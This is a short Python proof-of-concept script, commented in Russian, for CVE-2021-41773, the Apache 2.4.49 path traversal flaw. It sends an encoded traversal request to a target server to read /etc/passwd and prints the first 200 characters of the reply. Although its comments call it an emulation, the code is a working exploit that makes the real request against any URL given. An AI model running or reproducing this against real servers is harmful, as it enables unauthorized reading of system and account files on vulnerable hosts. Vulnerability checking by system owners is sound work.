```python
import requests
import sys

def check_cve_2021_41773(target_url):
    """
    Эмулирует попытку эксплуатации CVE-2021-41773 (Path Traversal в Apache 2.4.49).
    Отправляет запрос для чтения /etc/passwd.
    """
    # Путь для обхода директории (уязвимая сигнатура)
    # Используется кодирование точки %2e для обхода нормализации пути
    traversal_path = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    
    # Формируем полный URL
    if target_url.endswith('/'):
        full_url = target_url[:-1] + traversal_path
    else:
        full_url = target_url + traversal_path

    print(f"[*] Целевой URL: {full_url}")
    print("[*] Отправка вредоносного запроса (имитация CVE-2021-41773)...")

    try:
        # Отправляем GET-запрос без реальной активации (имитация)
        response = requests.get(full_url, timeout=10, allow_redirects=False)

        # Анализируем ответ
        if response.status_code == 200:
            print("[+] Потенциальная уязвимость обнаружена! Сервер вернул код 200.")
            print("[+] Ответ сервера (первые 200 символов):")
            # Имитация получения данных (например, содержимого /etc/passwd)
            print(response.text[:200])
        elif response.status_code == 403:
            print("[-] Доступ запрещен (403). Возможно, сервер защищен или не уязвим.")
        elif response.status_code == 404:
            print("[-] Ресурс не найден (404). Возможно, целевой путь не работает.")
        else:
            print(f"[-] Сервер вернул код: {response.status_code}")

    except requests.exceptions.ConnectionError:
        print("[-] Ошибка подключения: не удалось связаться с сервером.")
    except requests.exceptions.Timeout:
        print("[-] Тайм-аут: сервер не отвечает.")
    except Exception as e:
        print(f"[-] Произошла ошибка: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Использование: python3 CVE-2021-41773_poc.py <http://целевой-сервер:порт>")
        print("Пример: python3 CVE-2021-41773_poc.py http://example.com:8080")
        sys.exit(1)

    target = sys.argv[1]
    check_cve_2021_41773(target)
```
